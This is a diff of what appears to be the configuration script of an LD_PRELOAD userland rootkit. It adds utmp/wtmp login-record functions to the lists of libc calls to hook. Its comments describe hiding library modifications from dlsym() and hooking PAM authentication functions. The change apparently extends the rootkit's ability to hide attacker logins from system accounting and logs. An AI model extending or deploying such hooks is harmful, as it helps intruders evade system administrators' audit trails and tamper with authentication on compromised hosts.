@@ -80,7 +80,9 @@ CALLS = ["rename", "renameat", "renameat2", "fread",
          "audit_log_user_message", "audit_send", "getutent", "getutxent",
          "pututline", "pcap_loop", "getpwent", "syslog",
          "__syslog_chk", "dladdr", "dlinfo", "dlsym",
-         "socket", "login", "setegid"]
+         "socket", "login", "setegid", "pututxline",
+         "getutid", "getutxid", "getutmp", "getutmpx",
+         "updwtmp", "updwtmpx"]
 
 # the following three lists are just used to hide from dlsym()
 # read symbols/hiding/libdl/dlsym.c for hiding functionality in relation to dlsym()
@@ -106,7 +108,8 @@ LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
              "fsetxattr", "removexattr", "lremovexattr", "fremovexattr",
              "getutent", "getutxent", "pututline", "getpwent",
              "syslog", "__syslog_chk", "socket", "login",
-             "setegid"] # return original address for all of these libc functions
+             "setegid", "pututxline", "getutid", "getutxid",
+             "getutmp", "getutmpx", "updwtmp", "updwtmpx"] # return original address for all of these libc functions
 LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
 LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...
 
